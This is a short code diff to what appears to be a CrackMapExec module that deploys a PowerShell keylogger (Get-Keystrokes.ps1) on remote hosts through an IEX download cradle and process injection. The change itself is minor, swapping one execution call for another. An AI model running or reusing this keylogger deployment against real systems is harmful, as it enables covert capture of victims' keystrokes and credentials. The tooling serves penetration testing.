@@ -31,7 +31,7 @@ class CMEModule:
         self.stream  = False
         self.poll    = 20
         self.timeout = int(module_options['TIMEOUT'])
-        
+
         if 'STREAM' in module_options:
             self.stream = bool(module_options['STREAM'])
         if 'POLL' in module_options:
@@ -61,9 +61,8 @@ class CMEModule:
         keys_command = gen_ps_iex_cradle(context, 'Get-Keystrokes.ps1', command, post_back=False)
 
         launcher = gen_ps_inject(keys_command, context)
-        ps_command = create_ps_command(launcher)
 
-        connection.execute(ps_command)
+        connection.ps_execute(launcher)
         context.log.success('Executed launcher')
 
         if not self.stream:
